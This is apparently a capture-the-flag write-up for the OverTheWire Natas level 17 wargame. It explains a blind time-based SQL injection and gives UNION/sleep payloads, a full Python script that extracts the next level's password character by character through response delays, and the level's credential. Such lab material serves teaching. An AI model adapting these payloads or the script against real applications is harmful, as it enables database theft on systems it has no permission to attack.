# Username

# Web vulnerability
SQL injection, blind time-based injection
# Method of solve
From the source code, we know a few things
* the name of the table: "users"
* the columns in the table: "username", and "password"

We have to construct a payload that causes the app to sleep, because the app doesn't give us any text feedback.
We also need to construct a UNION-based payload and determine the number of columns returned.
This payload will get us started
```
" UNION SELECT 1,sleep(5) FROM users where username like 'a%';-- - 
```
We can shortcut this process by guessing that the username we're looking for is natas18. That means we can start leaking the user's password with this payload
```
" UNION SELECT 1,sleep(5) FROM users where username = 'natas18' and password like "a%";-- - 
```
We should automate this task, because the passwords are 32 characters long..
I got this code from the DeepSeek AI.
```
import requests
import string
import time

# Target URL and parameters
url = "http://natas17.natas.labs.overthewire.org/index.php"
auth = ("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")  # Replace with your creds

# Characters to test (alphanumeric + some special chars)
chars = string.ascii_letters + string.digits + "!@#$%^&*"
password = ""
found_char = True

while found_char:
    found_char = False
    for char in chars:
        # Payload: Checks if current password starts with (known_chars + new_char)
        payload = f'" UNION SELECT 1,sleep(5) FROM users where username = "natas18" and password LIKE BINARY "{password + char}%"; -- -'
        
        start_time = time.time()
        response = requests.post(
            url,
            auth=auth,
            data={"username": payload},
            proxies={"http": "http://127.0.0.1:8080"}  # Optional: Burp Suite proxy
        )
        elapsed = time.time() - start_time

        # If response took >5 seconds, char is correct
        if elapsed > 5:
            password += char
            print(f"Found char: {char} | Password so far: {password}")
            found_char = True
            break

    # If no new char found, password is complete
    if not found_char:
        print(f"Password extraction complete: {password}")
        break
```
